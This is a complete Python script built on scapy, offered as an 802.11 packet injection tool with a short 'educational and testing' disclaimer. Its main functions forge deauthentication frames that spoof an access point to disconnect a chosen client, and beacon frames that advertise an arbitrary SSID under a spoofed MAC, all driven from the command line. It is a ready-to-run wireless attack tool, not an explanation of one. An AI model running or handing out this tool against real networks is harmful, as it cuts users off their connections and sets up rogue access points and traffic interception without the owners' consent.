#!/usr/bin/env python3
"""
802.11 Packet Injection Tool

This tool allows users to inject custom 802.11 frames for testing purposes.

WARNING: This tool is for educational and testing purposes only. Unauthorized use of this tool may violate local laws and regulations. Use responsibly and ethically.
"""

from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Deauth, RadioTap, Dot11Elt
from scapy.all import sendp
import argparse

class PacketInjector:
    def __init__(self, iface):
        self.iface = iface

    def inject_packet(self, packet):
        """Inject a custom packet"""
        try:
            sendp(packet, iface=self.iface, verbose=False)
            print("[+] Packet injected successfully.")
        except Exception as e:
            print(f"[-] Failed to inject packet: {e}")

    def create_deauth_packet(self, target_mac, ap_mac):
        """Create a deauthentication packet"""
        packet = RadioTap()/Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)/Dot11Deauth(reason=7)
        return packet

    def create_beacon_packet(self, ssid, ap_mac):
        """Create a beacon frame"""
        packet = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=ap_mac, addr3=ap_mac)/Dot11Beacon()/Dot11Elt(ID="SSID", info=ssid)
        return packet

def main():
    parser = argparse.ArgumentParser(description="802.11 Packet Injection Tool")
    parser.add_argument("interface", help="Wireless interface in monitor mode")
    parser.add_argument("--deauth", nargs=2, metavar=("TARGET_MAC", "AP_MAC"), help="Inject a deauthentication packet")
    parser.add_argument("--beacon", nargs=2, metavar=("SSID", "AP_MAC"), help="Inject a beacon frame")

    args = parser.parse_args()

    injector = PacketInjector(args.interface)

    if args.deauth:
        target_mac, ap_mac = args.deauth
        packet = injector.create_deauth_packet(target_mac, ap_mac)
        injector.inject_packet(packet)

    if args.beacon:
        ssid, ap_mac = args.beacon
        packet = injector.create_beacon_packet(ssid, ap_mac)
        injector.inject_packet(packet)

if __name__ == "__main__":
    main()
